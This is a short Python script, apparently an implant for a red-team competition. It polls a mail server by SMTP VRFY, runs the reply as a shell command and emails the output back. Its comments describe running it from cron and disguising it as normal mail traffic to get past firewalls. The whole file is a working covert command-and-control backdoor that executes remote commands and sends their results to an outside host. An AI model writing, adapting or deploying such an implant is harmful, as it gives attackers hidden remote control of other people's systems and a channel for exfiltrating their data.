'''
The plan:
    This will keep getting run by cron or something
    Sends a VRFY request to get a command
    Sends an email with the output
Ideally, this should look like normal SMTP traffic to any firewall... but it's not cool enough to do what DNS does
'''
import smtplib
import socket
import subprocess
import getpass
SERVER = "mail2.teamX"
DEST_ADDR = "mailman@"+SERVER

def main():
    connection = smtplib.SMTP()
    connection.connect(SERVER, 25)
    connection.ehlo()
    username = getpass.getuser()
    # machineIP = socket.gethostbyname_ex(socket.gethostname())[-1][-1] #Tested on windows
    machineIP = socket.getfqdn() #should get full hostname/domain name
    emailAddr = username + "@" + machineIP
    command = connection.verify(emailAddr) #tuple of code and string response
    if(command[0] != 250):
        exit(0) #Wait for next run
    out = subprocess.Popen(command[1], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
    (stdout, stderr) = out.communicate()
    connection.sendmail(emailAddr, DEST_ADDR, stdout+"\n"+stderr)

main()